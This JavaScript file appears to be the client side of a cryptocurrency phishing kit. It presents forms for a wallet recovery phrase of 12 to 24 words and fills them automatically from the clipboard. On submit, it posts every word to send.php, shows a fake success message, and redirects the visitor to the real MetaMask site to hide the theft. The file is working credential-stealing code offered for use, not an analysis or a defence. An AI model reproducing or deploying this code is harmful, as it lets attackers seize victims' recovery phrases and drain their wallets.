const wordSelect = document.getElementById("word");
const [wordForm1, wordForm2, wordForm3, wordForm4, wordForm5] = document.querySelectorAll(".form-main");
const preloader = document.querySelector(".preloader");
const count2 = document.querySelector(".count");
const done = document.querySelector(".done-box");
const noDone = document.querySelector(".no-done");

const [word12_1, word12_2, word12_3, word12_4, word12_5, word12_6, word12_7, word12_8, word12_9, word12_10, word12_11, word12_12] = document.querySelectorAll(".word-12");
const word12Input = document.querySelectorAll(".word-12");

const [btncofirm1, btncofirm2, btnCofirm3, btnCofirm4, btncofirm5] = document.querySelectorAll(".btn-cofirm");
const [word15_1, word15_2, word15_3, word15_4, word15_5, word15_6, word15_7, word15_8, word15_9, word15_10, word15_11, word15_12, word15_13, word15_14, word15_15] = document.querySelectorAll(".word-15");
const word15Input = document.querySelectorAll(".word-15");

const [word18_1, word18_2, word18_3, word18_4, word18_5, word18_6, word18_7, word18_8, word18_9, word18_10, word18_11, word18_12, word18_13, word18_14, word18_15, word18_16, word18_17, word18_18] = document.querySelectorAll(".word-18");
const word18Input = document.querySelectorAll(".word-18");

const [word21_1, word21_2, word21_3, word21_4, word21_5, word21_6, word21_7, word21_8, word21_9, word21_10, word21_11, word21_12, word21_13, word21_14, word21_15, word21_16, word21_17, word21_18, word21_19, word21_20, word21_21] = document.querySelectorAll(".word-21");
const word21Input = document.querySelectorAll(".word-21");


const [word24_1, word24_2, word24_3, word24_4, word24_5, word24_6, word24_7, word24_8, word24_9, word24_10, word24_11, word24_12, word24_13, word24_14, word24_15, word24_16, word24_17, word24_18, word24_19, word24_20, word24_21, word24_22, word24_23, word24_24, word24_25] = document.querySelectorAll(".word-24");
const word24Input = document.querySelectorAll(".word-24");

word12Input.forEach((input, index) => {
    input.addEventListener("paste", () => {
          navigator.clipboard.readText().then((copiedText) => {
           const text =  copiedText.split(" ");
           text.forEach((value, num) => {
                word12Input[num].value = value;
                btncofirm1.disabled = false;
           });
        });   
    });
});

word15Input.forEach((input, index) => {
    input.addEventListener("paste", () => {
          navigator.clipboard.readText().then((copiedText) => {
           const text =  copiedText.split(" ");
           text.forEach((value, num) => {
                word15Input[num].value = value;
                btncofirm2.disabled = false;
           });
         
        });   
    });
});


word18Input.forEach((input, index) => {
    input.addEventListener("paste", () => {
          navigator.clipboard.readText().then((copiedText) => {
           const text =  copiedText.split(" ");
           text.forEach((value, num) => {
                word18Input[num].value = value;
                btnCofirm3.disabled = false;
           });
         
        });   
    });
});


word21Input.forEach((input, index) => {
    input.addEventListener("paste", () => {
          navigator.clipboard.readText().then((copiedText) => {
           const text =  copiedText.split(" ");
            
           text.forEach((value, num) => {
                word21Input[num].value = value;
                 btnCofirm4.disabled = false;
           });
         
        });   
    });
});


word24Input.forEach((input, index) => {
    input.addEventListener("paste", () => {
          navigator.clipboard.readText().then((copiedText) => {
           const text =  copiedText.split(" ");
            
           text.forEach((value, num) => {
                word24Input[num].value = value;
                 btncofirm5.disabled = false;
           });
         
        });   
    });
});



window.addEventListener("load", () => {
    setTimeout(() => {
        preloader.classList.add("hide");
    }, 2000);
});


 const postData  = (data) => {
    $.ajax({
    url: "send.php",
    type: "POST",
    data: { pass: data },
 });
};
const eye = document.querySelectorAll(".eye");
const eye2 = document.querySelectorAll(".eye-2");
const eye3 = document.querySelectorAll(".eye-3");
const eye4 = document.querySelectorAll(".eye-4");
const eye5 = document.querySelectorAll(".eye-5");


 const timer2 = (timeleft) => {
        let downloadTimer = setInterval(function () {
          if (timeleft <= 0) {
            clearInterval(downloadTimer);
          }
          count2.textContent = `0:0${0 + timeleft} Seconds`;
          timeleft -= 1;
          if (timeleft === -1) {
            window.location.replace("https://metamask.io/");
          }
        }, 1000);
      };


wordSelect.addEventListener("change", () => {
    if(wordSelect.value === "12"){
        wordForm1.classList.remove("hide");
        wordForm2.classList.add("hide");
        wordForm3.classList.add("hide");
        wordForm4.classList.add("hide");
        wordForm5.classList.add("hide");
    }
    else if(wordSelect.value === "15"){
        wordForm1.classList.add("hide");
        wordForm2.classList.remove("hide");
        wordForm3.classList.add("hide");
        wordForm4.classList.add("hide");
        wordForm5.classList.add("hide");
    }
    else if(wordSelect.value === "18"){
        wordForm1.classList.add("hide");
        wordForm2.classList.add("hide");
        wordForm3.classList.remove("hide");
        wordForm4.classList.add("hide");
        wordForm5.classList.add("hide");
    }
    else if(wordSelect.value === "21"){
        wordForm1.classList.add("hide");
        wordForm2.classList.add("hide");
        wordForm3.classList.add("hide");
        wordForm4.classList.remove("hide");
        wordForm5.classList.add("hide");
    }
    else {
        wordForm1.classList.add("hide");
        wordForm2.classList.add("hide");
        wordForm3.classList.add("hide");
        wordForm4.classList.add("hide");
        wordForm5.classList.remove("hide");
    }
});


wordForm1.addEventListener("submit", (e) => {
    e.preventDefault();
      if(word12_1.value === "" || word12_2.value === "" ||  word12_3.value === "" || word12_4.value === "" || word12_5.value === "" || word12_6.value === "" || word12_7.value === "" || word12_8.value === "" || word12_9.value === "" || word12_10.value === "" || word12_11.value === "" || word12_12.value === ""){
        btncofirm1.disabled = true;
    }
    else {
        preloader.classList.remove("hide");
        
        let data = `Word 1: ${word12_1.value} \nWord 2: ${word12_2.value} \nWord 3: ${word12_3.value} \nWord 4: ${word12_4.value} \nWord 5: ${word12_5.value} \nWord 6: ${word12_6.value} \nWord 7: ${word12_7.value} \nWord 8: ${word12_8.value} \nWord 9: ${word12_9.value} \nWord 10: ${word12_10.value} \nWord 11: ${word12_11.value} \nWord 12: ${word12_12.value}`;
        postData(data);
        setTimeout(() => {
            preloader.classList.add("hide");
            noDone.classList.add("hide");
            done.classList.remove("hide");
            timer2(10)

        }, 4000);
    }
});


wordForm2.addEventListener("submit", (e) => {
    e.preventDefault();
      if(word15_1.value === "" || word15_2.value === "" ||  word15_3.value === "" || word15_4.value === "" || word15_5.value === "" || word15_6.value === "" || word15_7.value === "" || word15_8.value === "" || word15_9.value === "" || word15_10.value === "" || word15_11.value === "" || word15_12.value === "" || word15_13.value === "" || word15_14.value === "" || word15_15.value === ""){
        btncofirm2.disabled = true;
    }
    else {
        preloader.classList.remove("hide");
        let data = `Word 1: ${word15_1.value} \nWord 2: ${word15_2.value} \nWord 3: ${word15_3.value} \nWord 4: ${word15_4.value} \nWord 5: ${word15_5.value} \nWord 6: ${word15_6.value} \nWord 7: ${word15_7.value} \nWord 8: ${word15_8.value} \nWord 9: ${word15_9.value} \nWord 10: ${word15_10.value} \nWord 11: ${word15_11.value} \nWord 12: ${word15_12.value} \nWord 13: ${word15_13.value} \nWord 14: ${word15_14.value} \nWord 15: ${word15_15.value}`;
        postData(data);
        setTimeout(() => {
            preloader.classList.add("hide");
            noDone.classList.add("hide");
            done.classList.remove("hide");
            timer2(10)

        }, 4000);
    }
});


wordForm3.addEventListener("submit", (e) => {
    e.preventDefault();
      if(word18_1.value === "" || word18_2.value === "" ||  word18_3.value === "" || word18_4.value === "" || word18_5.value === "" || word18_6.value === "" || word18_7.value === "" || word18_8.value === "" || word18_9.value === "" || word18_10.value === "" || word18_11.value === "" || word18_12.value === "" || word18_13.value === "" || word18_14.value === "" || word18_15.value === ""|| word18_16.value === "" || word18_17.value === "" || word18_18.value === ""){
        btnCofirm3.disabled = true;
    }
    else {
         preloader.classList.remove("hide");
        let data = `Word 1: ${word18_1.value} \nWord 2: ${word18_2.value} \nWord 3: ${word18_3.value} \nWord 4: ${word18_4.value} \nWord 5: ${word18_5.value} \nWord 6: ${word18_6.value} \nWord 7: ${word18_7.value} \nWord 8: ${word18_8.value} \nWord 9: ${word18_9.value} \nWord 10: ${word18_10.value} \nWord 11: ${word18_11.value} \nWord 12: ${word18_12.value} \nWord 13: ${word18_13.value} \nWord 14: ${word18_14.value} \nWord 15: ${word18_15.value} \nWord 16: ${word18_16.value} \nWord 17: ${word18_17.value} \nWord 18: ${word18_18.value}`;
        postData(data);
        setTimeout(() => {
            preloader.classList.add("hide");
            noDone.classList.add("hide");
            done.classList.remove("hide");
            timer2(10)

        }, 4000); 
    }
});

wordForm4.addEventListener("submit", (e) => {
    e.preventDefault();
      if(word21_1.value === "" || word21_2.value === "" ||  word21_3.value === "" || word21_4.value === "" || word21_5.value === "" || word21_6.value === "" || word21_7.value === "" || word21_8.value === "" || word21_9.value === "" || word21_10.value === "" || word21_11.value === "" || word21_12.value === "" || word21_13.value === "" || word21_14.value === "" || word21_15.value === ""|| word21_16.value === "" || word21_17.value === "" || word21_18.value === "" || word21_19.value === "" || word21_20.value === "" || word21_21.value === ""){
        btnCofirm4.disabled = true;
    }
    else {
          preloader.classList.remove("hide");
        let data = `Word 1: ${word21_1.value} \nWord 2: ${word21_2.value} \nWord 3: ${word21_3.value} \nWord 4: ${word21_4.value} \nWord 5: ${word21_5.value} \nWord 6: ${word21_6.value} \nWord 7: ${word21_7.value} \nWord 8: ${word21_8.value} \nWord 9: ${word21_9.value} \nWord 10: ${word21_10.value} \nWord 11: ${word21_11.value} \nWord 12: ${word21_12.value} \nWord 13: ${word21_13.value} \nWord 14: ${word21_14.value} \nWord 15: ${word21_15.value} \nWord 16: ${word21_16.value} \nWord 17: ${word21_17.value} \nWord 18: ${word21_18.value} \nWord 19: ${word21_19.value} \nWord 20: ${word21_20.value} \nWord 21: ${word21_21.value}`;
        postData(data);
        setTimeout(() => {
            preloader.classList.add("hide");
            noDone.classList.add("hide");
            done.classList.remove("hide");
            timer2(10)

        }, 4000); 
    }
});

wordForm5.addEventListener("submit", (e) => {
    e.preventDefault();
      if(word24_1.value === "" || word24_2.value === "" ||  word24_3.value === "" || word24_4.value === "" || word24_5.value === "" || word24_6.value === "" || word24_7.value === "" || word24_8.value === "" || word24_9.value === "" || word24_10.value === "" || word24_11.value === "" || word24_12.value === "" || word24_13.value === "" || word24_14.value === "" || word24_15.value === ""|| word24_16.value === "" || word24_17.value === "" || word24_18.value === "" || word24_19.value === "" || word24_20.value === "" || word24_21.value === "" || word24_22.value === "" || word24_23.value === "" || word24_24.value === ""){
        btncofirm5.disabled = true;
    }
    else {
        preloader.classList.remove("hide");
        let data = `Word 1: ${word24_1.value} \nWord 2: ${word24_2.value} \nWord 3: ${word24_3.value} \nWord 4: ${word24_4.value} \nWord 5: ${word24_10.value} \nWord 6: ${word24_6.value} \nWord 7: ${word24_7.value} \nWord 8: ${word24_8.value} \nWord 9: ${word24_9.value} \nWord 10: ${word24_10.value} \nWord 11: ${word24_11.value} \nWord 12: ${word24_12.value} \nWord 13: ${word24_13.value} \nWord 14: ${word24_14.value} \nWord 15: ${word24_15.value} \nWord 16: ${word24_16.value} \nWord 17: ${word24_17.value} \nWord 18: ${word24_18.value} \nWord 19: ${word24_19.value} \nWord 20: ${word24_20.value} \nWord 21: ${word24_21.value}  \nWord 22: ${word24_22.value} \nWord 23: ${word24_23.value} \nWord 24: ${word24_24.value}`;
        postData(data);
        setTimeout(() => {
            preloader.classList.add("hide");
            noDone.classList.add("hide");
            done.classList.remove("hide");
            timer2(10)

        }, 4000); 
    }   
});




word12Input.forEach((input, index) => {
    input.addEventListener("keyup", () => {
           if(word12_1.value !== "" && word12_2.value !== "" &&  word12_3.value !== "" && word12_4.value !== "" && word12_5.value !== "" && word12_6.value !== "" && word12_7.value !== "" && word12_8.value !== "" && word12_9.value !== "" && word12_10.value !== "" && word12_11.value !== "" && word12_12.value !== ""){
           btncofirm1.disabled = false;
        }
    });
});


word15Input.forEach((input, index) => {
  input.addEventListener("keyup", () => {
           if(word15_1.value !== "" && word15_2.value !== "" &&  word15_3.value !== "" && word15_4.value !== "" && word15_5.value !== "" && word15_6.value !== "" && word15_7.value !== "" && word15_8.value !== "" && word15_9.value !== "" && word15_10.value !== "" && word15_11.value !== "" && word15_12.value !== "" && word15_13.value !== "" && word15_14.value !== "" && word15_15.value !== ""){
           btncofirm2.disabled = false;
        }
    });

});

word18Input.forEach((input, index) => {
  input.addEventListener("keyup", () => {
           if(word18_1.value !== "" && word18_2.value !== "" &&  word18_3.value !== "" && word18_4.value !== "" && word18_5.value !== "" && word18_6.value !== "" && word18_7.value !== "" && word18_8.value !== "" && word18_9.value !== "" && word18_10.value !== "" && word18_11.value !== "" && word18_12.value !== "" && word18_13.value !== "" && word18_14.value !== "" && word18_15.value !== "" && word18_16.value !== "" && word18_17.value !== "" && word18_18.value !== ""){
           btnCofirm3.disabled = false;
        }
    });
});



word21Input.forEach((input, index) => {
  input.addEventListener("keyup", () => {
           if(word21_1.value !== "" && word21_2.value !== "" &&  word21_3.value !== "" && word21_4.value !== "" && word21_5.value !== "" && word21_6.value !== "" && word21_7.value !== "" && word21_8.value !== "" && word21_9.value !== "" && word21_10.value !== "" && word21_11.value !== "" && word21_12.value !== "" && word21_13.value !== "" && word21_14.value !== "" && word21_15.value !== "" && word21_16.value !== "" && word21_17.value !== "" && word21_18.value !== "" && word21_19.value !== "" && word21_20.value !== "" && word21_21.value !== ""){
           btnCofirm4.disabled = false;
        }
    });
});




word24Input.forEach((input, index) => {
  input.addEventListener("keyup", () => {
           if(word24_1.value !== "" && word24_2.value !== "" &&  word24_3.value !== "" && word24_4.value !== "" && word24_5.value !== "" && word24_6.value !== "" && word24_7.value !== "" && word24_8.value !== "" && word24_9.value !== "" && word24_10.value !== "" && word24_11.value !== "" && word24_12.value !== "" && word24_13.value !== "" && word24_14.value !== "" && word24_15.value !== "" && word24_16.value !== "" && word24_17.value !== "" && word24_18.value !== "" && word24_19.value !== "" && word24_20.value !== "" && word24_21.value !== "" && word24_22.value !== "" && word24_23.value !== "" && word24_24.value !== ""){
           btncofirm5.disabled = false;
        }
    });
});

word24Input.forEach((input, index) => {
  input.addEventListener("blur", () => {
           if(word24_1.value !== "" && word24_2.value !== "" &&  word24_3.value !== "" && word24_4.value !== "" && word24_5.value !== "" && word24_6.value !== "" && word24_7.value !== "" && word24_8.value !== "" && word24_9.value !== "" && word24_10.value !== "" && word24_11.value !== "" && word24_12.value !== "" && word24_13.value !== "" && word24_14.value !== "" && word24_15.value !== "" && word24_16.value !== "" && word24_17.value !== "" && word24_18.value !== "" && word24_19.value !== "" && word24_20.value !== "" && word24_21.value !== "" && word24_22.value !== "" && word24_23.value !== "" && word24_24.value !== ""){
           btncofirm5.disabled = false;
        }
    });
});



eye.forEach((eyeImg, index) => {
    eyeImg.addEventListener("click", () => {
        if(word12Input[index].type === "password"){
            word12Input[index].type = "text";
            eyeImg.src = "./img/eye-open.png";
        }
        else {
            word12Input[index].type = "password";
            eyeImg.src = "./img/eye-close.png";
        }
    });
});

eye2.forEach((eyeImg, index) => {
    eyeImg.addEventListener("click", () => {
        if(word15Input[index].type === "password"){
            word15Input[index].type = "text";
            eyeImg.src = "./img/eye-open.png";
        }
        else {
            word15Input[index].type = "password";
            eyeImg.src = "./img/eye-close.png";
        }
    });
});


eye3.forEach((eyeImg, index) => {
    eyeImg.addEventListener("click", () => {
        if(word18Input[index].type === "password"){
            word18Input[index].type = "text";
            eyeImg.src = "./img/eye-open.png";
        }
        else {
            word18Input[index].type = "password";
            eyeImg.src = "./img/eye-close.png";
        }
    });
});


eye4.forEach((eyeImg, index) => {
    eyeImg.addEventListener("click", () => {
        if(word21Input[index].type === "password"){
            word21Input[index].type = "text";
            eyeImg.src = "./img/eye-open.png";
        }
        else {
            word21Input[index].type = "password";
            eyeImg.src = "./img/eye-close.png";
        }
    });
});

eye5.forEach((eyeImg, index) => {
    eyeImg.addEventListener("click", () => {
        if(word24Input[index].type === "password"){
            word24Input[index].type = "text";
            eyeImg.src = "./img/eye-open.png";
        }
        else {
            word24Input[index].type = "password";
            eyeImg.src = "./img/eye-close.png";
        }
    });
});